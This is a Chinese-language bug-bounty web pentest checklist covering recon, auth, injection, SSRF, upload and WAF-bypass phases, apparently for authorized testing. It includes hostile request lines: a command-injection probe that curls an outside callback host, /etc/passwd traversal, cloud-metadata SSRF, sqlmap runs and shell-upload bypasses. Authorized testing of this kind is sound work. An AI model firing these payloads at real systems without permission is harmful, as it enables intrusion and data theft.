---
type: wiki
category: checklist
status: active
last-updated: 2026-04-21
source: https://github.com/D3n0Duz/WebPentestChecklist + bbflow 實戰經驗
---

# 新標的檢測 Checklist

> 拿到一個新的 Bug Bounty 標的時，從上到下照這份 checklist 跑一遍。
> 每個項目都標註對應的 **bbflow hunter** / **wiki 章節** / **手動指令**。
> 靈感：[D3n0Duz/WebPentestChecklist](https://github.com/D3n0Duz/WebPentestChecklist) + bbflow 實戰累積。

## Phase 0 — Scope 確認（強制）

- [ ] 建立 `research/<target>/SCOPE.md`（完整 in-scope + OOS + bounty range）
- [ ] 加入 `research/PROGRAMS.md` 索引
- [ ] 確認 program platform（HackerOne / Bugcrowd / YesWeHack / Intigriti / HITCON）
- [ ] 搜尋 disclosed reports + hacktivity 避免撞洞
- [ ] 查詢 graphify 知識圖譜看是否有過去紀錄
  - `graphify query "target_name" --graph "<vault>/graphify-out/graph.json"`（若有建 KB）

## Phase 1 — 應用程式對應（Application Mapping）

### 1.1 子域名列舉

```bash
# 一鍵
bbflow recon target.com

# 手動
subfinder -d target.com -silent | anew subs.txt
amass enum -passive -d target.com -silent | anew subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u | anew subs.txt
```

- [ ] 執行 `bbflow recon`（subfinder + amass + crt.sh + chaos）
- [ ] 執行 `httpx` 存活探測（帶 tech fingerprint）
- [ ] 產出 `alive.txt`（存活）+ `techs.txt`（技術識別）
- [ ] 分類：prod / non-prod（dev/uat/test/stage/beta）

### 1.2 技術堆疊識別

```bash
# httpx + wappalyzer
httpx -l subs.txt -tech-detect -title -status-code -silent | tee techs.txt

# whatweb
whatweb -a 3 https://target.com
```

- [ ] 識別 Web server（Apache / Nginx / IIS / Caddy）
- [ ] 識別 Framework（WordPress / Laravel / Spring / Django / Rails / .NET）
- [ ] 識別 CDN / WAF（Cloudflare / Akamai / Imperva / SafeLine / AWS）
- [ ] 識別 DB（若有 error page）

### 1.3 Port scan

```bash
# 非標 port 也很重要（WAF 常只保護 80/443）
rustscan -a target.com --ulimit 5000 -- -sV
naabu -host target.com -top-ports 1000
```

- [ ] Top 1000 port
- [ ] 特別注意：7001 (WebLogic) / 8080 / 8443 / 8888 / 9000 / 9090 / 27017 (Mongo) / 6379 (Redis)

### 1.4 內容發現

```bash
# 一鍵
bbflow hunt target --only crawl-chain

# 手動
katana -u https://target -d 5 -jc -silent > katana.txt
gau --subs target.com > gau.txt
waybackurls target.com > wayback.txt
cat katana.txt gau.txt wayback.txt | uro > endpoints.txt
```

- [ ] `crawl-chain` hunter 跑完
- [ ] `sort -u` 合併產生 `endpoints.txt`
- [ ] `gf` 分類產生 `gf_xss.txt` / `gf_sqli.txt` / etc.

## Phase 2 — 低噪音資訊洩漏（先跑這個，WAF 友善）

### 2.1 SCM / 配置檔暴露

```bash
bbflow hunt target --only config-leak,git-exposure,backup-files,sourcemap,envdata
```

對應 hunter：
- [ ] **config-leak** — 100+ 敏感路徑（wiki [10](10-hunter-config-leak.md)）
- [ ] **git-exposure** — `.git/` 洩漏 + git-dumper 還原
- [ ] **backup-files** — 壓縮檔/dump 偵測（wiki [12](12-hunter-backup-files.md)）
- [ ] **sourcemap** — JS source map 洩漏
- [ ] **envdata** — `window.envData` / config 物件洩漏
- [ ] **hardcoded-js-secrets** — JS 抽 token/api_key
- [ ] **trufflehog** — 掃 git 歷史 secret

### 2.2 Swagger / API docs

```bash
# config-leak 會掃，但也可手動確認
for p in /swagger-ui.html /v2/api-docs /v3/api-docs /openapi.json /api-docs /docs; do
  curl -sI "https://target${p}" | head -1
done
```

- [ ] 找到 Swagger → 紀錄 endpoint
- [ ] 往裡面看哪個 endpoint 沒 auth

### 2.3 Cloud Metadata / S3

```bash
# AWS / GCP / Azure metadata SSRF
nuclei -u https://target -tags ssrf,cloud -silent

# S3 bucket
# 找子域名 .s3.amazonaws.com
```

## Phase 3 — 認證與授權

### 3.1 認證機制

- [ ] 註冊流程：有無 email 驗證 / phone 驗證
- [ ] 登入流程：有無 captcha / rate limit
- [ ] **User enumeration**：email enum / username enum（`hunt-user-enum`）
- [ ] **帳密重置**：token 可預測？link 有 TTL？
- [ ] **預設帳密**：`hunt-weak-login`（wiki [11](11-hunter-weak-login.md)）

```bash
bbflow hunt target --only user-enum,weak-login
```

### 3.2 Session 管理

- [ ] Cookie flags（HttpOnly / Secure / SameSite）
- [ ] Session token 可預測？（UUID / sequential ID）
- [ ] **JWT**：有無 `alg=none` / weak secret / `kid` injection（`hunt-jwt`）
- [ ] Session fixation：登入前後 session 是否換？
- [ ] Logout：token 是否真的失效？

```bash
bbflow hunt target --only jwt
```

### 3.3 授權測試

- [ ] **IDOR**：對每個 `/user/:id` 試別人的 ID
- [ ] **Horizontal**：同層級角色（用戶 A 看用戶 B）
- [ ] **Vertical**：低權限 → 高權限 endpoint
- [ ] **GraphQL**：`__schema` introspection + 未授權 mutation（`hunt-graphql-idor`）

```bash
bbflow hunt target --only graphql-idor
```

## Phase 4 — 輸入驗證漏洞

### 4.1 XSS

```bash
# 自動
bbflow hunt target --only crawl-chain,nuclei-deep
CATEGORY=xss tools/hunters/hunt-nuclei-deep.sh https://target

# 手動 dalfox（最強 XSS scanner）
dalfox file gf_xss.txt --silence -o dalfox.txt
dalfox url "https://target/search?q=test" --silence
```

- [ ] Reflected XSS（URL param）
- [ ] Stored XSS（form / comment）
- [ ] DOM XSS（JS 操作 `location` / `innerHTML`）

### 4.2 SQL Injection

```bash
# 自動
CATEGORY=sqli tools/hunters/hunt-nuclei-deep.sh https://target

# sqlmap 手動
sqlmap -u "https://target/page.php?id=1" --batch --random-agent --level 3 --risk 2

# 時間注入（沒錯誤訊息時）
sqlmap -u "https://target/page.php?id=1" --technique=T --time-sec 5
```

- [ ] Error-based（錯誤訊息洩漏）
- [ ] Union-based
- [ ] Boolean-based（回應差異）
- [ ] Time-based（盲注）

### 4.3 Command Injection / RCE

```bash
CATEGORY=rce tools/hunters/hunt-nuclei-deep.sh https://target

# 手動測試（需 OAST）
curl "https://target/ping?host=127.0.0.1;curl+oast.me/x"
```

- [ ] 參數注入 `;`、`&&`、`|`、backtick
- [ ] 框架層 RCE（Log4j / Spring4Shell / Shiro / Fastjson / Struts2）
- [ ] Template injection（SSTI）

```bash
CATEGORY=ssti tools/hunters/hunt-nuclei-deep.sh https://target
```

### 4.4 Path Traversal / LFI

```bash
CATEGORY=lfi tools/hunters/hunt-nuclei-deep.sh https://target

# 手動
curl "https://target/file?name=../../../../etc/passwd"
curl "https://target/file?name=....//....//....//etc/passwd"  # 雙點繞過
```

- [ ] `../` 基本
- [ ] URL encode / double encode
- [ ] Null byte（老系統）
- [ ] LFI → RCE（log poisoning / phar://）

### 4.5 XXE

```bash
CATEGORY=xxe tools/hunters/hunt-nuclei-deep.sh https://target
```

- [ ] XML upload 點
- [ ] SOAP endpoint
- [ ] SVG 上傳（可能 XXE）

### 4.6 SSRF

```bash
CATEGORY=ssrf OAST=1 tools/hunters/hunt-nuclei-deep.sh https://target

# 手動
curl "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS
curl "https://target/fetch?url=http://metadata.google.internal/"          # GCP
```

- [ ] 文件上傳 / URL 抓取功能
- [ ] Webhook / callback URL
- [ ] PDF / image generator（HTML → PDF 常有 SSRF）
- [ ] Import 功能（OAuth redirect_uri）

### 4.7 Open Redirect

```bash
CATEGORY=redirect tools/hunters/hunt-nuclei-deep.sh https://target

bbflow hunt target --only open-redirect
```

- [ ] Login redirect param（`?redirect=`）
- [ ] Logout redirect
- [ ] OAuth state（可能 CSRF + redirect）

## Phase 5 — 業務邏輯

這些 nuclei 掃不到，要靠手動：

- [ ] **Race condition** — 同時送 2 個請求測試（discount code、transfer）
- [ ] **Price manipulation** — 負數 / 小數
- [ ] **Coupon reuse** — 同一個 code 用多次
- [ ] **Workflow bypass** — 跳過 step 2 直接到 step 4
- [ ] **Auth bypass** — `?auth=1` / `?admin=true`
- [ ] **Mass assignment** — 送 `isAdmin=true` 看會不會被接受

## Phase 6 — API 專項

### 6.1 REST

- [ ] 未授權 endpoint（GET/POST 不需 token）
- [ ] HTTP method 差異（`GET /api/users` 要 auth，`POST /api/users` 不要？）
- [ ] Content-Type 切換（`application/json` vs `application/xml`）
- [ ] Rate limit（每 endpoint 獨立？）

### 6.2 GraphQL

```bash
bbflow hunt target --only graphql-idor

# 手動
curl -X POST https://target/graphql -d '{"query":"{__schema{types{name}}}"}'
```

- [ ] Introspection 開啟
- [ ] Query depth limit
- [ ] Field-level auth check（IDOR）
- [ ] Batch attack（`[{...},{...}]`）

### 6.3 WebSocket

- [ ] Origin 檢查
- [ ] 訊息 format

## Phase 7 — CORS / Misc

### 7.1 CORS

```bash
bbflow hunt target --only cors-reflect
```

- [ ] `Access-Control-Allow-Origin: *` + credentials
- [ ] Reflective origin（回傳任意 origin）
- [ ] Null origin 允許
- [ ] Regex bypass

### 7.2 CSRF

- [ ] 敏感操作有無 CSRF token
- [ ] SameSite cookie 設定
- [ ] POST vs GET

### 7.3 Clickjacking

```bash
curl -sI https://target/ | grep -i "x-frame-options\|content-security-policy"
```

- [ ] X-Frame-Options 缺失
- [ ] frame-ancestors CSP 缺失

### 7.4 Subdomain Takeover

```bash
bbflow hunt target --only subdomain-takeover
```

## Phase 8 — 檔案上傳

- [ ] Extension bypass（`.php.jpg` / `.php%00.jpg` / `.phtml`）
- [ ] Content-Type 繞過
- [ ] SVG 上傳（XSS / XXE）
- [ ] ZIP 上傳（ZipSlip）
- [ ] 檔名路徑 traversal（`../../shell.php`）

## Phase 9 — WAF 繞過（若被擋）

```bash
bbflow hunt target --only waf-bypass

# 或直接
tools/hunters/hunt-waf-bypass.sh https://target
```

見 [14-waf-bypass-commands.md](14-waf-bypass-commands.md)：
- [ ] 識別 WAF（wafw00f）
- [ ] 找 origin IP（crt.sh + Shodan）
- [ ] 非標 port
- [ ] Non-prod 子域名
- [ ] HTTP 層 bypass（header / method / encoding）

## Phase 10 — 送件前最後檢查

- [ ] PoC 用 curl 獨立重現過（不靠 Burp session）
- [ ] 漏洞類型分類精準（VRT 不要選會自動建議高 severity 的）
- [ ] Severity 符合實際（不誇大為 RCE）
- [ ] 對照 program 的 disclosed reports 查重
- [ ] Impact 只列「已驗證」的，理論影響放 Potential
- [ ] 截圖 + 敘述 + 重現步驟三合一
- [ ] 使用工具 + GitHub URL + 安裝指令
- [ ] 不成立的嘗試記錄

見 [41-checklist-before-submit.md](41-checklist-before-submit.md)。

## 時間分配建議（給 8 小時一個標的）

| Phase | 時間 |
|-------|------|
| 0. Scope | 10 分 |
| 1. Mapping | 30 分 |
| 2. Info leak | 20 分 |
| 3. Auth | 1 小時 |
| 4. Input vuln | 2 小時 |
| 5. Logic | 1 小時 |
| 6. API | 1.5 小時 |
| 7. Misc | 30 分 |
| 8. Upload | 30 分 |
| 9. WAF bypass | 20 分（若需要） |
| 10. Report | 40 分 |

## 關聯文件

- [00-bbflow-complete-flow.md](00-bbflow-complete-flow.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [41-checklist-before-submit.md](41-checklist-before-submit.md)
- [WebPentestChecklist](https://github.com/D3n0Duz/WebPentestChecklist)
